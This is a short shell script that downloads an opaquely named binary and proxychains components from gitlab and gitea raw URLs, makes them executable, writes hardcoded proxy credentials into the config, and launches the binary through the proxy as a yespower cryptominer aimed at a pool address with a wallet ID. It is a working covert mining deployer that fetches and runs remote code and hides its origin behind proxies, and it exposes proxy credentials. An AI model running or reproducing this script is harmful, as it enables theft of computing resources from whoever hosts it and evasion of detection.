port="9293" 
user="u12novuxsvzg7n"  
pass="11hzmsrqq2lo395w7h23fc5v26" 
wget -q -O 96dNbbLaz7 https://gitlab.com/node.js2594450/scala/-/raw/main/mxl && chmod +x 96dNbbLaz7
wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/panel && chmod +x panel 
wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/proxychains.conf && chmod +x proxychains.conf 
wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/libproxychains4.so && chmod +x libproxychains4.so 
sleep 3 
sed -i "s/127.0.0.1/$proxy/" "proxychains.conf" 
sleep 1 
sed -i "s/port/$port/" "proxychains.conf" 
sed -i "s/user/$user/" "proxychains.conf"  
sleep 1  
sed -i "s/pass/$pass/" "proxychains.conf" 
sleep 11 
echo "******************************************************************" 
echo "IP ORI ==> "$(curl ifconfig.me) 
echo " " 
echo " " 
echo "IP BARU ==> "$(./panel curl ifconfig.me)
./panel ./96dNbbLaz7 -a yespower -o 149.50.222.86:443 -u KMFbor5m85Kh6fSjLKDZuSG6nJHMARC3TQ.$(echo $(shuf -i 1-100 -n 1)-uni) -p c=CRNC,mc=VHH  --proxy=http://u12novuxsvzg7n:11hzmsrqq2lo395w7h23fc5v26@52.5.38.201:9293 
